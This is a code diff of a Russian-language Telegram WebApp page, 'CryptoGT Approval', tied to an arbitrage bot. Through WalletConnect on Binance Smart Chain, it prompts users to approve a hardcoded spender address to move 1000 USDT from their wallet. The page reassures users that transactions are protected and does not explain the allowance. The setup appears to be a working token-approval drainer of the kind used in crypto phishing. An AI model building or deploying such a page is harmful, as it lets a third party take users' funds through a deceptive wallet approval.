@@ -2,13 +2,16 @@
 <html lang="ru">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>WalletConnect Approval - CryptoGT</title>
-  
-  <!-- Библиотеки -->
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+  />
+  <title>WalletConnect Approval – CryptoGT</title>
+
+  <!-- Web3 и QRCode (UMD‑версии) -->
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>
-  
+
   <style>
     :root {
       --tg-bg: #17212b;
@@ -17,22 +20,22 @@
       --tg-primary: #2ea6ff;
       --tg-danger: #e64a45;
     }
-    
+
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
-    
+
     body {
       background: var(--tg-bg);
       color: var(--tg-text);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
       min-height: 100vh;
       padding: 20px 15px;
       line-height: 1.5;
     }
-    
+
     .container {
       max-width: 500px;
       margin: 0 auto;
@@ -40,24 +43,24 @@
       flex-direction: column;
       min-height: 95vh;
     }
-    
+
     header {
       text-align: center;
       margin-bottom: 30px;
       padding-top: 10px;
     }
-    
+
     h1 {
       font-size: 22px;
       margin-bottom: 5px;
       font-weight: 600;
     }
-    
+
     .subtitle {
       color: var(--tg-hint);
       font-size: 15px;
     }
-    
+
     .card {
       background: rgba(255, 255, 255, 0.05);
       border-radius: 16px;
@@ -65,7 +68,7 @@
       margin-bottom: 20px;
       text-align: center;
     }
-    
+
     #status {
       font-size: 17px;
       margin-bottom: 20px;
@@ -75,7 +78,7 @@
       justify-content: center;
       white-space: pre-wrap;
     }
-    
+
     #qr-container {
       width: 220px;
       height: 220px;
@@ -84,12 +87,12 @@
       padding: 10px;
       border-radius: 12px;
     }
-    
+
     #qr {
       width: 100%;
       height: 100%;
     }
-    
+
     .instructions {
       background: rgba(46, 166, 255, 0.1);
       border-radius: 12px;
@@ -98,27 +101,27 @@
       text-align: left;
       font-size: 14px;
     }
-    
+
     .instructions h3 {
       margin-bottom: 8px;
       color: var(--tg-primary);
     }
-    
+
     .instructions ol {
       padding-left: 20px;
     }
-    
+
     .instructions li {
       margin-bottom: 5px;
     }
-    
+
     .btn-group {
       display: flex;
       gap: 10px;
       margin-top: auto;
       padding-top: 20px;
     }
-    
+
     button {
       flex: 1;
       padding: 15px;
@@ -129,50 +132,50 @@
       cursor: pointer;
       transition: all 0.2s;
     }
-    
+
     #cancelBtn {
       background: rgba(255, 255, 255, 0.08);
       color: var(--tg-text);
     }
-    
+
     #cancelBtn:hover {
       background: rgba(255, 255, 255, 0.15);
     }
-    
+
     #openInTg {
       background: var(--tg-primary);
       color: white;
     }
-    
+
     #openInTg:hover {
       opacity: 0.9;
     }
-    
+
     .warning {
       color: #ffa726;
       margin: 10px 0;
     }
-    
+
     .success {
       color: #66bb6a;
     }
-    
+
     .error {
       color: var(--tg-danger);
     }
-    
+
     .hidden {
       display: none;
     }
-    
+
     footer {
       text-align: center;
       margin-top: 30px;
       color: var(--tg-hint);
       font-size: 13px;
     }
-    
-    /* Для обычного браузера */
+
+    /* Для пользователя, открывшего через обычный браузер */
     .browser-warning {
       background: rgba(230, 74, 69, 0.15);
       border-radius: 12px;
@@ -188,23 +191,24 @@
       <h1>CryptoGT Approval</h1>
       <div class="subtitle">Подтвердите транзакцию через WalletConnect</div>
     </header>
-    
+
+    <!-- Предупреждение для тех, кто открыл вне Telegram -->
     <div id="browserWarning" class="browser-warning hidden">
       <p>Для лучшего опыта откройте это приложение в Telegram через нашего бота</p>
     </div>
-    
+
     <div class="card">
       <div id="status">Инициализация приложения...</div>
-      
+
       <div id="qr-container">
         <canvas id="qr"></canvas>
       </div>
-      
+
       <div id="gasInfo" class="hidden">
         <div>Расчетный газ: <span id="gasEstimate">0</span> Gwei</div>
       </div>
     </div>
-    
+
     <div id="instructions" class="instructions hidden">
       <h3>Как подключить:</h3>
       <ol>
@@ -214,12 +218,12 @@
         <li>Подтвердите подключение в кошельке</li>
       </ol>
     </div>
-    
+
     <div class="btn-group">
       <button id="cancelBtn">Отменить</button>
       <button id="openInTg" class="hidden">Открыть в Telegram</button>
     </div>
-    
+
     <footer>
       <div>© 2023 CryptoGT</div>
       <div>Все транзакции защищены</div>
@@ -227,143 +231,175 @@
   </div>
 
   <script type="module">
-    import SignClient from "https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.21.0/+esm";
+    // ─── Вариант А: подключаем SignClient через esm.sh ─────────────────────
+    import SignClient from "https://esm.sh/@walletconnect/sign-client@2.21.0";
 
-    // Конфигурация
+    // ─── Конфигурация ───────────────────────────────────────────────────────
     const CONFIG = {
-      USDT_CONTRACT: "0x55d398326f99059fF775485246999027b3197955",
-      ARB_SPENDER: "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577",
+      USDT_CONTRACT: "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
+      ARB_SPENDER:   "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase(),
       WC_PROJECT_ID: "d868f90cd734355ae0320f8f0258b6b1",
-      WC_RELAY_URL: "wss://relay.walletconnect.com",
-      BSC_RPC_URL: "https://bsc-dataseed.binance.org/",
+      WC_RELAY_URL:  "wss://relay.walletconnect.com",
+      BSC_RPC_URL:   "https://bsc-dataseed.binance.org/",
       TELEGRAM_BOT_URL: "https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
-      AMOUNT: "1000" // USDT
+      AMOUNT:        "1000" // USDT
     };
 
-    // Инициализация элементов
-    const statusEl = document.getElementById("status");
-    const qrCanvas = document.getElementById("qr");
-    const cancelBtn = document.getElementById("cancelBtn");
-    const openInTgBtn = document.getElementById("openInTg");
-    const instructionsEl = document.getElementById("instructions");
-    const browserWarning = document.getElementById("browserWarning");
+    // ─── Инициализация элементов DOM ──────────────────────────────────────
+    const statusEl      = document.getElementById("status");
+    const qrCanvas      = document.getElementById("qr");
+    const cancelBtn     = document.getElementById("cancelBtn");
+    const openInTgBtn   = document.getElementById("openInTg");
+    const instructionsEl= document.getElementById("instructions");
+    const browserWarning= document.getElementById("browserWarning");
     const gasEstimateEl = document.getElementById("gasEstimate");
-    const gasInfo = document.getElementById("gasInfo");
+    const gasInfo       = document.getElementById("gasInfo");
 
-    // Проверка среды выполнения
+    // ─── Проверка среды выполнения ─────────────────────────────────────────
     const isTelegramWebView = window.Telegram && window.Telegram.WebApp;
-    
+
     if (isTelegramWebView) {
+      console.log("[Debug] Открыто в Telegram WebView");
       Telegram.WebApp.ready();
       Telegram.WebApp.expand();
     } else {
+      console.log("[Debug] Открыто вне Telegram WebView");
       browserWarning.classList.remove("hidden");
       openInTgBtn.classList.remove("hidden");
       instructionsEl.classList.remove("hidden");
-      
+
       openInTgBtn.addEventListener("click", () => {
         window.open(CONFIG.TELEGRAM_BOT_URL, "_blank");
       });
     }
 
-    // Основная функция
+    // ─── Вспомогательная функция для обновления статуса ────────────────────
+    function updateStatus(text, type) {
+      statusEl.textContent = text;
+      statusEl.className = "";
+      if (type) {
+        statusEl.classList.add(type);
+      }
+    }
+
+    // ─── Основная функция WalletConnect ───────────────────────────────────
     async function initWalletConnect() {
       try {
-        // 1. Подготовка суммы для approve
+        // 1. Подготовка суммы (в Wei)
+        console.log("[Step 1] Подготовка суммы для approve");
         updateStatus("Подготовка транзакции...");
         const amountWei = Web3.utils.toBN(CONFIG.AMOUNT)
-                               .mul(Web3.utils.toBN("1000000000000000000"))
-                               .toString();
-        
-        // 2. Инициализация клиента WalletConnect
+                             .mul(Web3.utils.toBN("1000000000000000000"))
+                             .toString();
+        console.log("[Step 1] amountWei:", amountWei);
+
+        // 2. Инициализация SignClient
+        console.log("[Step 2] Инициализация SignClient");
         updateStatus("Инициализация WalletConnect...");
         const client = await SignClient.init({
           projectId: CONFIG.WC_PROJECT_ID,
-          relayUrl: CONFIG.WC_RELAY_URL,
+          relayUrl:  CONFIG.WC_RELAY_URL,
           metadata: {
-            name: "CryptoGT Approval",
+            name:        "CryptoGT Approval",
             description: "Approve USDT transaction via WalletConnect",
-            url: window.location.href,
-            icons: ["https://cryptogt.app/icon.png"],
+            url:         window.location.href,
+            icons:       ["https://cryptogt.app/icon.png"],
           },
           storageOptions: { database: ":memory:" },
         });
+        console.log("[Step 2] SignClient инициализирован:", client);
 
-        // 3. Генерация сессии
+        // 3. Генерация сессии (uri + approval)
+        console.log("[Step 3] Генерация сессии WalletConnect (client.connect)");
         updateStatus("Генерация подключения...");
         const { uri, approval } = await client.connect({
           requiredNamespaces: {
             eip155: {
               methods: ["eth_sendTransaction", "eth_chainId"],
-              chains: ["eip155:56"],
-              events: ["chainChanged"],
+              chains:  ["eip155:56"],
+              events:  ["chainChanged"],
             },
           },
         });
+        console.log("[Step 3] URI получен:", uri);
 
         // 4. Отображение QR-кода
+        console.log("[Step 4] Рисуем QR-код");
         updateStatus("Отсканируйте QR-код в кошельке");
         instructionsEl.classList.remove("hidden");
         QRCode.toCanvas(qrCanvas, uri, { width: 200, margin: 1 });
-        
+        console.log("[Step 4] QR-код отображён");
+
         // 5. Ожидание подключения
+        console.log("[Step 5] Ожидание approval()");
         updateStatus("Ожидание подключения кошелька...");
         await approval();
-        
+        console.log("[Step 5] Сессия подтверждена");
+
         // 6. Проверка сети
+        console.log("[Step 6] Проверка chainId через client.request");
         updateStatus("Проверка сети...");
         const topic = client.session.topics[0];
         const chainId = await client.request({
           topic,
           chainId: "eip155:56",
-          request: { method: "eth_chainId" }
+          request: { method: "eth_chainId" },
         });
-        
+        console.log("[Step 6] Вернулся chainId:", chainId);
+
         if (chainId !== "0x38") {
           throw new Error("Пожалуйста, переключитесь на сеть Binance Smart Chain (chainId: 56)");
         }
 
         // 7. Подготовка данных транзакции
+        console.log("[Step 7] Подготовка данных approve");
         updateStatus("Подготовка данных...");
         const web3 = new Web3(CONFIG.BSC_RPC_URL);
-        
+        console.log("[Step 7] Новый Web3:", web3);
+
         const approveABI = {
           constant: false,
           inputs: [
             { name: "spender", type: "address" },
-            { name: "amount", type: "uint256" }
+            { name: "amount",  type: "uint256" }
           ],
           name: "approve",
           outputs: [{ name: "", type: "bool" }],
           type: "function"
         };
-        
+
         const data = web3.eth.abi.encodeFunctionCall(
           approveABI,
           [CONFIG.ARB_SPENDER, amountWei]
         );
-        
-        // 8. Расчет газа
+        console.log("[Step 7] Сгенерирован data:", data);
+
+        // 8. Расчёт газа
+        console.log("[Step 8] Расчёт газа через web3");
         updateStatus("Расчет комиссии...");
         const gasEstimate = await web3.eth.estimateGas({
-          to: CONFIG.USDT_CONTRACT,
+          to:   CONFIG.USDT_CONTRACT,
           data: data
         });
-        
+        console.log("[Step 8] gasEstimate (wei):", gasEstimate);
+
         const gasPrice = await web3.eth.getGasPrice();
-        const gasPriceGwei = Math.round(web3.utils.fromWei(gasPrice, 'gwei'));
-        
+        const gasPriceGwei = Math.round(web3.utils.fromWei(gasPrice, "gwei"));
+        console.log("[Step 8] gasPrice (wei):", gasPrice, "gasPrice (Gwei):", gasPriceGwei);
+
         gasInfo.classList.remove("hidden");
         gasEstimateEl.textContent = gasPriceGwei;
-        
+
         const txParams = {
-          to: CONFIG.USDT_CONTRACT,
-          data: data,
-          gas: web3.utils.toHex(Math.round(gasEstimate * 1.2)), // +20% buffer
+          to:       CONFIG.USDT_CONTRACT,
+          data:     data,
+          gas:      web3.utils.toHex(Math.round(gasEstimate * 1.2)), // +20% буфер
           gasPrice: gasPrice
         };
+        console.log("[Step 8] txParams:", txParams);
 
         // 9. Отправка транзакции
+        console.log("[Step 9] Отправка eth_sendTransaction через client.request");
         updateStatus("Подтвердите транзакцию в кошельке...");
         const txHash = await client.request({
           topic,
@@ -373,39 +409,43 @@
             params: [txParams],
           },
         });
+        console.log("[Step 9] Вернулся txHash:", txHash);
 
         // 10. Успешное завершение
         updateStatus("✅ Транзакция успешно отправлена!\n\nTX Hash:\n" + txHash, "success");
-        
+        console.log("[Step 10] Транзакция отправлена, txHash:", txHash);
+
         if (isTelegramWebView) {
-          setTimeout(() => Telegram.WebApp.close(), 5000);
+          setTimeout(() => {
+            console.log("[Step 10] Закрываем WebApp через Telegram.WebApp.close()");
+            Telegram.WebApp.close();
+          }, 5000);
         }
       } catch (err) {
-        console.error("Ошибка:", err);
+        console.error("[Error] ", err);
         updateStatus("❌ Ошибка: " + (err.message || err), "error");
       }
     }
 
-    // Вспомогательные функции
-    function updateStatus(text, type) {
-      statusEl.textContent = text;
-      statusEl.className = "";
-      if (type) statusEl.classList.add(type);
-    }
-
-    // Обработчики событий
+    // ─── Обработчик кнопки «Отменить» ───────────────────────────────────────
     cancelBtn.addEventListener("click", () => {
       if (isTelegramWebView) {
+        console.log("[Event] Кнопка Отменить нажата, закрываем WebApp");
         Telegram.WebApp.close();
       } else {
+        console.log("[Event] Кнопка Отменить нажата вне WebView");
         if (confirm("Закрыть приложение?")) {
           window.close();
         }
       }
     });
 
-    // Запуск приложения
-    initWalletConnect();
+    // ─── Запуск WalletConnect ───────────────────────────────────────────────
+    // Делаем небольшой таймаут, чтобы интерфейс успел отобразиться
+    setTimeout(() => {
+      console.log("[Init] Запускаем initWalletConnect()");
+      initWalletConnect();
+    }, 100);
   </script>
 </body>
 </html>
